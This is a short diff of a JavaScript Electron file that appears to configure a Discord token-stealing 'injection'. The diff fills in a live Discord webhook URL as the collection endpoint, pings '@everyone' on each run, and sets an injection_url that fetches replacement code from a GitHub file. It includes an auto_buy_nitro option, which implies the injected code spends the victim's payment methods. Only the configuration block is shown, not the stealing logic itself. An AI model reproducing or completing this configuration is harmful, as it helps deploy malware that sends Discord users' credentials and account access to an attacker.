@@ -6,15 +6,15 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
+  webhook: 'https://discord.com/api/webhooks/1226291927792619612/icrj-1BuiF7MA3zVt6T3Tfzie2_ZGfWrSxNzkd8xZGWFG_DrY5JGryNJ7o_gQCdHWJpV', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Test Injection', 
-  embed_icon: ''.replace(/ /g, '%20'), 
+  embed_icon: 'https://avatars.githubusercontent.com/u/166258577?v=4'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: '', 
+  injection_url: 'https://github.com/Yasinwashere/something/edit/main/replacement.js/raw', 
   /**
    
    **/
